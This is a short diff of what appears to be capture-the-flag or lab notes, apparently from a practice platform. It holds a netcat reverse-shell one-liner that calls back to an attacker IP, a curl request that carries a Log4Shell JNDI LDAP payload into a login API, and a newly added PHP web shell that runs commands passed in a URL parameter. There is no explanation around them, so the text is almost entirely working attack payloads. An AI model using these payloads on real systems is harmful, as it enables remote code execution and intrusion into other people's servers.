@@ -26,3 +26,9 @@ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.8 333 >/tmp
 ```bash
 curl -i -s -k -X POST -H $'Host: 10.129.96.149:8443' --data-binary $'{\"username\":\"a\",\"password\":\"a\",\"remember\":\"${jndi:ldap://10.10.15.152:1389/o=tomcat}\",\"strict\":true}' $'https://10.129.96.149:8443/api/login'
 ```
+
+```
+<?php echo system($_GET['cmd']); ?>
+
+system($_GET['cmd']);
+```
